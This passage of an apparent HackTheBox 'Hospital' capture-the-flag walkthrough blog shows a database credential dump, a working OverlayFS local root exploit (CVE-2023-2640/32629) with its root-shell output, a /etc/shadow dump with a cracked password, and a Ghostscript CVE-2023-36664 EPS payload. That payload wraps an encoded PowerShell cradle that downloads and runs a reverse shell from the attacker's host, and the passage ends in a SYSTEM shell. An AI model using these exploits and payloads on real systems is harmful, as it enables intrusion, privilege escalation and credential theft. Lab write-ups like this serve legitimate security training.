<span class="o">|</span> <span class="mi">13</span> <span class="o">|</span> <span class="n">madz</span>        <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">NuS</span><span class="p">.</span><span class="mi">66</span><span class="n">jXERxZMDePQKsIT</span><span class="p">.</span><span class="n">Qd6AsdLs5b07Uk4VG</span><span class="o">/</span><span class="n">ETc1hlF8YNwQm</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">16</span> <span class="mi">00</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">34</span> <span class="o">|</span>
<span class="o">|</span> <span class="mi">14</span> <span class="o">|</span> <span class="n">admin121</span>    <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">nP5qLBm82ZALvbYSHL3Qxuo3X4</span><span class="o">/</span><span class="n">Q8l4Y5XTp4W6z6S4zs4DH6NBtO</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">16</span> <span class="mi">14</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">19</span> <span class="o">|</span>
<span class="o">|</span> <span class="mi">15</span> <span class="o">|</span> <span class="n">admin1</span>      <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="mi">4</span><span class="o">/</span><span class="n">Aq</span><span class="p">.</span><span class="n">uoTbL1ATFb9uB5AVuK7LnltPUUXUfPsr16hxbG2c5bD8PtZW</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">16</span> <span class="mi">17</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">39</span> <span class="o">|</span>
<span class="o">|</span> <span class="mi">16</span> <span class="o">|</span> <span class="n">z43lzzzz</span>    <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">evBzhCXKWgq4o1wcURk6a</span><span class="p">.</span><span class="n">bUKR8tELPwLauN3s7krZKaUzt9k1VMa</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">17</span> <span class="mi">01</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">42</span> <span class="o">|</span>
<span class="o">|</span> <span class="mi">17</span> <span class="o">|</span> <span class="n">kali</span>        <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">olcQ8Y7yWy07id9vIJvEBe8SghKo4wPqCybIp5HJAi0IQizZsqTmm</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">18</span> <span class="mi">18</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">33</span> <span class="o">|</span>
<span class="o">|</span> <span class="mi">18</span> <span class="o">|</span> <span class="mi">12301230</span><span class="n">aa</span>  <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">IipXHcnm7S</span><span class="p">.</span><span class="n">ltguRckRea</span><span class="p">.</span><span class="n">OkWDjZxFTRHarkTMgFENx02fitTbTxq</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">18</span> <span class="mi">23</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">13</span> <span class="o">|</span>
<span class="o">|</span> <span class="mi">19</span> <span class="o">|</span> <span class="k">user</span>        <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">lraCdCzRutTxtUs3vIqBy</span><span class="p">.</span><span class="n">SlQBkK369CGSa3</span><span class="p">.</span><span class="n">TC8IXlAoUpBn2hzS</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">19</span> <span class="mi">01</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">22</span> <span class="o">|</span>
<span class="o">|</span> <span class="mi">20</span> <span class="o">|</span> <span class="n">user2</span>       <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">JxXppT</span><span class="p">.</span><span class="n">H0hISyuXQvBPLPOmeMaaSOeh5E9oHmsWCVsnR4jDfn05WG</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">19</span> <span class="mi">02</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">01</span> <span class="o">|</span>
<span class="o">|</span> <span class="mi">21</span> <span class="o">|</span> <span class="n">jeffer</span>      <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">kGFiHcbkziSG5srhLVbKlO4exHMKglXIqYqDfq4pXF2</span><span class="p">.</span><span class="n">Bdr6t8g1S</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">19</span> <span class="mi">04</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">41</span> <span class="o">|</span>
<span class="o">|</span> <span class="mi">22</span> <span class="o">|</span> <span class="n">strongshiv8</span> <span class="o">|</span> <span class="err">$</span><span class="mi">2</span><span class="n">y</span><span class="err">$</span><span class="mi">10</span><span class="err">$</span><span class="n">utQztY9JIt0jkFmznWziQOmjgA1TbmPxz7sQDShnqkz6AmEdmo1ei</span> <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">19</span> <span class="mi">16</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">05</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">----+-------------+--------------------------------------------------------------+---------------------+</span>
<span class="mi">22</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">hospital</span><span class="p">]</span><span class="o">&gt;</span> 
</pre></table></code></div></div><p>I stored these data in <code class="language-plaintext highlighter-rouge">credentials.txt</code> file then extracted the hashes from decryption into another file and the usernames in another file like this :</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kaliüî•kali<span class="o">)</span>-[~/Downloads/HTB/Hospital]
‚îî‚îÄ<span class="nv">$ </span><span class="nb">cat </span>credentials.txt| <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'|'</span> <span class="nt">-f</span> 4 | <span class="nb">sed</span> <span class="s2">"s/ //g"</span> <span class="o">&gt;</span> hashes.txt
</pre></table></code></div></div><p>and the usernames like this ‚è¨</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kaliüî•kali<span class="o">)</span>-[~/Downloads/HTB/Hospital]
‚îî‚îÄ<span class="nv">$ </span><span class="nb">cat </span>credentials.txt| <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'|'</span> <span class="nt">-f</span> 3 | <span class="nb">sed</span> <span class="s2">"s/ //g"</span> <span class="o">&gt;</span> usernames.txt
   
‚îå‚îÄ‚îÄ<span class="o">(</span>kaliüî•kali<span class="o">)</span>-[~/Downloads/HTB/Hospital]
‚îî‚îÄ<span class="nv">$ </span><span class="nb">cat </span>usernames.txt 
admin
patient
harlock
regis
...
...
</pre></table></code></div></div><p>I checked the kernel version and on web I found this version is vulnerable to this <code class="language-plaintext highlighter-rouge">CVE-2023-2640</code> &amp; <code class="language-plaintext highlighter-rouge">CVE-2023-32629</code> and so I tried these CVE‚Äôs exploit from here ‚è¨ https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/ I got this code working fine ‚è¨</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>unshare <span class="nt">-rm</span> sh <span class="nt">-c</span> <span class="s2">"mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(</span><span class="se">\"</span><span class="s2">id</span><span class="se">\"</span><span class="s2">)'"</span>
</pre></table></code></div></div><p>I tried on this system and I got this result üîΩ <a href="/assets/images/Pasted%20image%2020240219163645.png" class="popup img-link shimmer"><img src="/assets/images/Pasted%20image%2020240219163645.png" alt="Image" loading="lazy"></a> <em>The command of id as root user is working</em> Lets try to get the root shell with making the bash with SUIDs permission :</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>www-data@webserver:/dev/shm<span class="nv">$ </span>unsharunshare <span class="nt">-rm</span> sh <span class="nt">-c</span> <span class="s2">"mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(</span><span class="se">\"</span><span class="s2">cp /bin/bash /var/tmp/dash &amp;&amp; chmod 4755 /var/tmp/dash &amp;&amp; /var/tmp/dash -p &amp;&amp; rm -rf l m u w /var/tmp/dash</span><span class="se">\"</span><span class="s2">)'"</span>
unshare <span class="nt">-rm</span> sh <span class="nt">-c</span> <span class="s2">"mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;
&gt; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(</span><span class="se">\"</span><span class="s2">cp /bin/bash /var/tmp/dash &amp;&amp; chmod 4755 /var/tmp/dash &amp;&amp; /var/tmp/dash -p &amp;&amp; rm -rf l m u w /var/tmp/dash</span><span class="se">\"</span><span class="s2">)'"</span>
dash: /root/.bashrc: Permission denied
root@webserver:/dev/shm# <span class="nb">whoami
whoami
</span>root
root@webserver:/dev/shm# 
root@webserver:/dev/shm# <span class="nb">cd</span> /root
<span class="nb">cd</span> /root
dash: <span class="nb">cd</span>: /root: Permission denied
root@webserver:/dev/shm# <span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@webserver:/dev/shm# <span class="nb">cd</span> /root/
<span class="nb">cd</span> /root/
dash: <span class="nb">cd</span>: /root/: Permission denied
root@webserver:/dev/shm# <span class="nb">ls</span> <span class="nt">-al</span> /var/tmp/dash
<span class="nb">ls</span> <span class="nt">-al</span> /var/tmp/dash
<span class="nt">-rwsr-xr-x</span> 1 root root 1437832 Feb 19 18:23 /var/tmp/dash
root@webserver:/dev/shm#
</pre></table></code></div></div><p>Now lets see the users and there password from the shadow file ‚è¨</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>root@webserver:/dev/shm# <span class="nb">cat</span> /ecat /etc/shadow
<span class="nb">cat</span> /etc/shadow
root:<span class="nv">$y$j9T$s</span>/Aqv48x449udndpLC6eC.<span class="nv">$WUkrXgkW46N4xdpnhMoax7US</span>.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
daemon:<span class="k">*</span>:19462:0:99999:7:::
bin:<span class="k">*</span>:19462:0:99999:7:::
sys:<span class="k">*</span>:19462:0:99999:7:::
<span class="nb">sync</span>:<span class="k">*</span>:19462:0:99999:7:::
games:<span class="k">*</span>:19462:0:99999:7:::
man:<span class="k">*</span>:19462:0:99999:7:::
lp:<span class="k">*</span>:19462:0:99999:7:::
mail:<span class="k">*</span>:19462:0:99999:7:::
news:<span class="k">*</span>:19462:0:99999:7:::
uucp:<span class="k">*</span>:19462:0:99999:7:::
proxy:<span class="k">*</span>:19462:0:99999:7:::
www-data:<span class="k">*</span>:19462:0:99999:7:::
backup:<span class="k">*</span>:19462:0:99999:7:::
list:<span class="k">*</span>:19462:0:99999:7:::
irc:<span class="k">*</span>:19462:0:99999:7:::
_apt:<span class="k">*</span>:19462:0:99999:7:::
nobody:<span class="k">*</span>:19462:0:99999:7:::
systemd-network:!<span class="k">*</span>:19462::::::
systemd-timesync:!<span class="k">*</span>:19462::::::
messagebus:!:19462::::::
systemd-resolve:!<span class="k">*</span>:19462::::::
pollinate:!:19462::::::
sshd:!:19462::::::
syslog:!:19462::::::
uuidd:!:19462::::::
tcpdump:!:19462::::::
tss:!:19462::::::
landscape:!:19462::::::
fwupd-refresh:!:19462::::::
drwilliams:<span class="nv">$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w</span>/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::
root@webserver:/dev/shm# 
</pre></table></code></div></div><p>I got the password hash for user <code class="language-plaintext highlighter-rouge">drwilliams</code> and I decoded it through <a href="https://hashes.com/en/decrypt/hash">hashes.com</a> site and I got the password ‚è¨ <a href="/assets/images/Pasted%20image%2020240219172719.png" class="popup img-link shimmer"><img src="/assets/images/Pasted%20image%2020240219172719.png" alt="Image" loading="lazy"></a></p><div class="language-text nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>drwilliams : qwe123!@#
</pre></table></code></div></div><p>Now I also tried to login into the port 443 Hospital site with this credentials and I got in ‚è¨ <a href="/assets/images/Pasted%20image%2020240219172901.png" class="popup img-link shimmer"><img src="/assets/images/Pasted%20image%2020240219172901.png" alt="Image" loading="lazy"></a> <em>Dashboard works as mail system</em> A mail stated this information : <a href="/assets/images/Pasted%20image%2020240219173121.png" class="popup img-link shimmer"><img src="/assets/images/Pasted%20image%2020240219173121.png" alt="Image" loading="lazy"></a> <em>Mail from drbrown to Lucy stated about the ghostscript !</em></p><p>This means I have to create a payload in <code class="language-plaintext highlighter-rouge">.eps</code> format that will be execute after uploading it.</p><p>So I found 1 exploit that works as Command Injection and will generate the payload in <code class="language-plaintext highlighter-rouge">.eps</code> format.</p><h5 id="cve-2023-36664-command-injection-with-ghostscript-poc--exploit"><span class="me-2"><a href="https://www.vicarius.io/vsociety/posts/cve-2023-36664-command-injection-with-ghostscript-poc-exploit">CVE-2023-36664: Command injection with Ghostscript PoC + exploit</a></span><a href="#cve-2023-36664-command-injection-with-ghostscript-poc--exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/Downloads/HTB/Hospital]
‚îî‚îÄ<span class="nv">$ </span>python3 exploit.py <span class="nt">--generate</span> <span class="nt">--payload</span> <span class="s1">'cmd.exe /c powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEAOAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQA='</span> <span class="nt">--filename</span> run <span class="nt">--extension</span> eps
</pre></table></code></div></div><p>Now the payload is created so lets upload it as a attachment of a mail and wait for its execution of this payload from machine ‚è¨</p><p><a href="/assets/images/Pasted%20image%2020240426135633.png" class="popup img-link shimmer"><img src="/assets/images/Pasted%20image%2020240426135633.png" alt="Image" loading="lazy"></a> I have to wait a while so that the payload of <code class="language-plaintext highlighter-rouge">ghostscript</code> works on the system ‚è¨</p><p><a href="/assets/images/Pasted%20image%2020240426141337.png" class="popup img-link shimmer"><img src="/assets/images/Pasted%20image%2020240426141337.png" alt="Image" loading="lazy"></a> <em>Got the reverse Shell</em></p><p>Lets talk about above pictures Points ‚è¨</p><ol><li>I generated a <span style="color:#fd77f8">powershell</span> payload that is encoded with <span style="color:#fd77f8">UTF16 little endian</span> that works for windows system + <span style="color:#fd77f8">base64</span> encoded it.</ol><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'IEX(New-Object Net.WebClient).downloadString("http://10.10.16.18/Invoke-PowerShellTcp.ps1")'</span>| iconv <span class="nt">--to-code</span> UTF-16LE | <span class="nb">base64</span> <span class="nt">-w</span> 0
<span class="nv">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEAOAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQA</span><span class="o">=</span>
</pre></table></code></div></div><ol><li>Then I ran the exploit and generated the exploit file named as <span style="color:#fd77f8">run.eps</span>.</ol><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/Downloads/HTB/Hospital]
‚îî‚îÄ<span class="nv">$ </span>python3 exploit.py <span class="nt">--generate</span> <span class="nt">--payload</span> <span class="s1">'cmd.exe /c powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEAOAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQA='</span> <span class="nt">--filename</span> run <span class="nt">--extension</span> eps 
<span class="o">[</span>+] Generated EPS payload file: run.eps
</pre></table></code></div></div><ol><li>I started the python http server on port 80 where the exploit will download it and execute it.<li>This is a netcat listener on port 445 where I will be capturing this revere shell.</ol><p>Let dig deeper and after some enumeration I found nothing to exploit . So I checked <span style="color:#fd77f8">xmpp</span> server and its directory <span style="color:#f04276">htdocs</span> . If this folder have the permissions to add a file ,Then this file that will be appended into this directory can give me <code class="language-plaintext highlighter-rouge">nt\authority system</code> user shell.</p><p><a href="/assets/images/Pasted%20image%2020240426144558.png" class="popup img-link shimmer"><img src="/assets/images/Pasted%20image%2020240426144558.png" alt="Image" loading="lazy"></a> <em>Reverse Shell file execution lets to shell</em></p><div class="language-powershell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
</pre><td class="rouge-code"><pre><span class="n">C:\xampp\htdocs</span><span class="err">&gt;</span><span class="nx">whoami</span><span class="w">
</span><span class="n">nt</span><span class="w"> </span><span class="nx">authority\system</span><span class="w">

</span><span class="n">C:\xampp\htdocs</span><span class="err">&gt;</span><span class="nx">cd</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="w">

</span><span class="n">C:\Users\Administrator</span><span class="err">&gt;</span><span class="nx">tree</span><span class="w"> </span><span class="nx">/f/</span><span class="w"> </span><span class="nx">a</span><span class="w">
</span><span class="n">Parameter</span><span class="w"> </span><span class="nx">format</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">correct</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">/f/</span><span class="w">

</span><span class="n">C:\Users\Administrator</span><span class="err">&gt;</span><span class="nx">tree</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">/a</span><span class="w">
</span><span class="n">Folder</span><span class="w"> </span><span class="nx">PATH</span><span class="w"> </span><span class="nx">listing</span><span class="w">
</span><span class="n">Volume</span><span class="w"> </span><span class="nx">serial</span><span class="w"> </span><span class="nx">number</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">7357-966F</span><span class="w">
</span><span class="n">C:.</span><span class="w">
</span><span class="o">+---.</span><span class="nf">cache</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="n">\---selenium</span><span class="w">
</span><span class="o">|</span><span class="w">       </span><span class="o">|</span><span class="w">   </span><span class="n">se-metadata.json</span><span class="w">
</span><span class="o">|</span><span class="w">       </span><span class="o">|</span><span class="w">   
</span><span class="o">|</span><span class="w">       </span><span class="n">\---IEDriverServer</span><span class="w">
</span><span class="o">|</span><span class="w">           </span><span class="n">\---win32</span><span class="w">
</span><span class="o">|</span><span class="w">               </span><span class="n">\---4.14.0</span><span class="w">
</span><span class="o">|</span><span class="w">                       </span><span class="n">IEDriverServer.exe</span><span class="w">
</span><span class="o">|</span><span class="w">                       
</span><span class="o">+---.</span><span class="nf">dotnet</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mf">7.0</span><span class="o">.</span><span class="nf">400</span><span class="o">.</span><span class="nf">aspNetCertificateSentinel</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mf">7.0</span><span class="o">.</span><span class="nf">400</span><span class="o">.</span><span class="nf">dotnetFirstUseSentinel</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mf">7.0</span><span class="o">.</span><span class="nf">400</span><span class="o">.</span><span class="nf">toolpath</span><span class="o">.</span><span class="nf">sentinel</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mf">7.0</span><span class="o">.</span><span class="nf">400_IsDockerContainer</span><span class="o">.</span><span class="nf">dotnetUserLevelCache</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mf">7.0</span><span class="o">.</span><span class="nf">400_MachineId</span><span class="o">.</span><span class="nf">dotnetUserLevelCache</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="n">MachineId.v1.dotnetUserLevelCache</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">   
</span><span class="o">|</span><span class="w">   </span><span class="n">\---TelemetryStorageService</span><span class="w">
</span><span class="o">|</span><span class="w">           </span><span class="mi">20230907145524</span><span class="err">_</span><span class="mi">35</span><span class="n">f147a68ca74125843c0c427356e016.trn</span><span class="w">
</span><span class="o">|</span><span class="w">           </span><span class="mi">20230907145524</span><span class="err">_</span><span class="mi">8375</span><span class="n">b2fd144a49a3bfa8bc0b289462fb.trn</span><span class="w">
</span><span class="o">|</span><span class="w">           </span><span class="mi">20230907145524</span><span class="err">_</span><span class="mi">94</span><span class="n">ec144dd2034f1f9159e8b7e192b058.trn</span><span class="w">
</span><span class="o">|</span><span class="w">           </span><span class="mi">20230907145548</span><span class="err">_</span><span class="mi">41</span><span class="n">d0c74b997b47e892da107feea41166.trn</span><span class="w">
</span><span class="o">|</span><span class="w">           </span><span class="mi">20230907145548</span><span class="err">_</span><span class="mi">43</span><span class="n">d9a351377141078596efec7433284e.trn</span><span class="w">
</span><span class="o">|</span><span class="w">           </span><span class="mi">20230907145548</span><span class="err">_</span><span class="n">c654bfec8cf74af8b113fa1eee8d1816.trn</span><span class="w">
</span><span class="o">|</span><span class="w">           
</span><span class="o">+---.</span><span class="nf">ssh</span><span class="w">
</span><span class="o">|</span><span class="w">       </span><span class="n">known_hosts</span><span class="w">
</span><span class="o">|</span><span class="w">       
</span><span class="o">+-</span><span class="nt">--3D</span><span class="w"> </span><span class="n">Objects</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Contacts</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Desktop</span><span class="w">
</span><span class="o">|</span><span class="w">       </span><span class="n">root.txt</span><span class="w">
</span><span class="o">|</span><span class="w">       
</span><span class="o">+-</span><span class="nt">--Documents</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">+-</span><span class="nt">--installers</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">+-</span><span class="nt">--scripts</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">       </span><span class="n">cleaner.bat</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">       </span><span class="n">vm_comp.ps1</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">       
</span><span class="o">|</span><span class="w">   </span><span class="o">+-</span><span class="nt">--vms</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">       </span><span class="n">LinuxServer.vhd</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">       
</span><span class="o">|</span><span class="w">   </span><span class="n">\---WindowsPowerShell</span><span class="w">
</span><span class="o">|</span><span class="w">       </span><span class="n">\---Scripts</span><span class="w">
</span><span class="o">|</span><span class="w">           </span><span class="n">\---InstalledScriptInfos</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Downloads</span><span class="w">
</span><span class="o">|</span><span class="w">       </span><span class="n">python-3.12.0-amd64.exe</span><span class="w">
</span><span class="o">|</span><span class="w">       
</span><span class="o">+-</span><span class="nt">--ExchangeLanguagePack</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Favorites</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="n">Bing.url</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">   
</span><span class="o">|</span><span class="w">   </span><span class="n">\---Links</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Links</span><span class="w">
</span><span class="o">|</span><span class="w">       </span><span class="n">Desktop.lnk</span><span class="w">
